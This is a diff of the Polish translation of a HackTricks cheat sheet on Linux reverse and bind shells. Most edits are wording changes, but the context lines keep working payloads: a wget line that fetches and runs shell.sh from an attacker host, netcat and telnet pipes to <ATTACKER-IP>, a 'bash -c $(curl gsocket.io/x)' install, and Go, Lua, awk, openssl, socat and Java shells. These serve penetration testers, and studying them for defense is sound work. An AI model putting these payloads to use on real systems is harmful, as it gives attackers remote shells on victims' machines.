@@ -6,8 +6,8 @@
 
 Inne sposoby wsparcia HackTricks:
 
-* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
-* Kup [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
+* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF** sprawdź [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
+* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
 * Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
 * **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
 * **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
@@ -16,15 +16,15 @@ Inne sposoby wsparcia HackTricks:
 
 **Try Hard Security Group**
 
-<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
+<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
 
 {% embed url="https://discord.gg/tryhardsecurity" %}
 
 ***
 
-**Jeśli masz pytania dotyczące któregokolwiek z tych shelli, możesz je sprawdzić na** [**https://explainshell.com/**](https://explainshell.com)
+**Jeśli masz pytania dotyczące któregokolwiek z tych shelli, możesz je sprawdzić za pomocą** [**https://explainshell.com/**](https://explainshell.com)
 
-## Pełne TTY
+## Full TTY
 
 **Gdy już uzyskasz odwrócony shell**[ **przeczytaj tę stronę, aby uzyskać pełne TTY**](full-ttys.md)**.**
 
@@ -67,11 +67,11 @@ wget http://<IP attacker>/shell.sh -P /tmp; chmod +x /tmp/shell.sh; /tmp/shell.s
 ```
 ## Forward Shell
 
-Podczas radzenia sobie z podatnością na **Remote Code Execution (RCE)** w aplikacji internetowej opartej na systemie Linux, osiągnięcie odwrotnego powłoki może być utrudnione przez zabezpieczenia sieciowe, takie jak reguły iptables lub złożone mechanizmy filtrowania pakietów. W takich ograniczonych środowiskach alternatywnym podejściem jest ustanowienie powłoki PTY (Pseudo Terminal), aby efektywniej komunikować się z skompromitowanym systemem.
+Podczas radzenia sobie z podatnością na **zdalne wykonanie kodu (RCE)** w aplikacji internetowej opartej na systemie Linux, osiągnięcie odwrotnego powłoki może być utrudnione przez zabezpieczenia sieciowe, takie jak reguły iptables lub złożone mechanizmy filtrowania pakietów. W takich ograniczonych środowiskach alternatywnym podejściem jest ustanowienie powłoki PTY (Pseudo Terminal), aby efektywniej komunikować się z skompromitowanym systemem.
 
 Polecane narzędzie do tego celu to [toboggan](https://github.com/n3rada/toboggan.git), które ułatwia interakcję z docelowym środowiskiem.
 
-Aby efektywnie wykorzystać toboggan, stwórz moduł Pythona dostosowany do kontekstu RCE twojego systemu docelowego. Na przykład, moduł o nazwie `nix.py` może być zorganizowany w następujący sposób:
+Aby efektywnie wykorzystać toboggan, stwórz moduł Pythona dostosowany do kontekstu RCE twojego systemu docelowego. Na przykład moduł o nazwie `nix.py` może być zorganizowany w następujący sposób:
 ```python3
 import jwt
 import httpx
@@ -122,13 +122,13 @@ rm -f /tmp/bkpipe;mknod /tmp/bkpipe p;/bin/sh 0</tmp/bkpipe | nc <ATTACKER-IP> <
 ```
 ## gsocket
 
-Sprawdź to na [https://www.gsocket.io/deploy/](https://www.gsocket.io/deploy/)
+Sprawdź to pod adresem [https://www.gsocket.io/deploy/](https://www.gsocket.io/deploy/)
 ```bash
 bash -c "$(curl -fsSL gsocket.io/x)"
 ```
 ## Telnet
 
-Telnet jest protokołem sieciowym służącym do zdalnego logowania się na systemy. Może być używany do zdalnego zarządzania systemami oraz przesyłania danych. Telnet przesyła dane w postaci zwykłego tekstu, co oznacza, że nie jest zaszyfrowany i może stanowić ryzyko dla bezpieczeństwa.
+Telnet jest protokołem sieciowym, który umożliwia zdalne logowanie się do hostów. Może być używany do zdalnego zarządzania systemami oraz do przesyłania poleceń. Telnet przesyła dane w postaci tekstu, co oznacza, że ​​nie jest zaszyfrowany i może stanowić ryzyko dla bezpieczeństwa.
 ```bash
 telnet <ATTACKER-IP> <PORT> | /bin/sh #Blind
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|telnet <ATTACKER-IP> <PORT> >/tmp/f
@@ -193,8 +193,6 @@ attacker> ncat -v 10.0.0.22 4444 --ssl
 echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","192.168.0.134:8080");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go
 ```
 ## Lua
-
-Lua jest językiem skryptowym, który jest często używany do tworzenia skryptów i rozszerzeń w różnych aplikacjach. Lua jest łatwy w nauce i ma prostą składnię, co czyni go popularnym wyborem w świecie programowania. Lua może być również używany do pisania skryptów do automatyzacji zadań w systemach operacyjnych.
 ```bash
 #Linux
 lua -e "require('socket');require('os');t=socket.tcp();t:connect('10.0.0.1','1234');os.execute('/bin/sh -i <&3 >&3 2>&3');"
@@ -264,7 +262,7 @@ openssl.exe s_client -quiet -connect <ATTACKER_IP>:<PORT1>|cmd.exe|openssl s_cli
 
 [https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries)
 
-### Powłoka typu bind
+### Powiązane powłoki
 ```bash
 victim> socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
 attacker> socat FILE:`tty`,raw,echo=0 TCP:<victim_ip>:1337
@@ -284,7 +282,7 @@ awk 'BEGIN {s = "/inet/tcp/0/<IP>/<PORT>"; while(42) { do{ printf "shell>" |& s;
 ```bash
 while true; do nc -l 79; done
 ```
-Aby wysłać polecenie, zapisz je, naciśnij Enter, a następnie naciśnij CTRL+D (aby zatrzymać STDIN)
+Aby wysłać polecenie, napisz je, naciśnij Enter, a następnie naciśnij CTRL+D (aby zatrzymać STDIN)
 
 **Ofiara**
 ```bash
@@ -294,7 +292,7 @@ export X=Connected; while true; do X=`eval $(finger "$X"@<IP> 2> /dev/null | gre
 ```
 ## Gawk
 
-Gawk (GNU Awk) jest potężnym narzędziem do przetwarzania tekstu i raportowania w systemach Unix/Linux. Może być używany do manipulacji i analizy danych tekstowych, a także do automatyzacji zadań. Gawk jest często wykorzystywany przez hakerów do przetwarzania i filtrowania danych podczas testów penetracyjnych.
+## Gawk
 ```bash
 #!/usr/bin/gawk -f
 
@@ -323,7 +321,7 @@ To spróbuje połączyć się z twoim systemem na porcie 6001:
 ```bash
 xterm -display 10.0.0.1:1
 ```
-Aby przechwycić odwrotną powłokę, możesz użyć (która będzie nasłuchiwać na porcie 6001):
+Aby przechwycić odwróconą powłokę, możesz użyć (która będzie nasłuchiwać na porcie 6001):
 ```bash
 # Authorize host
 xhost +targetip
@@ -348,7 +346,7 @@ Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new
 
 **Try Hard Security Group**
 
-<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
+<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
 
 {% embed url="https://discord.gg/tryhardsecurity" %}
 
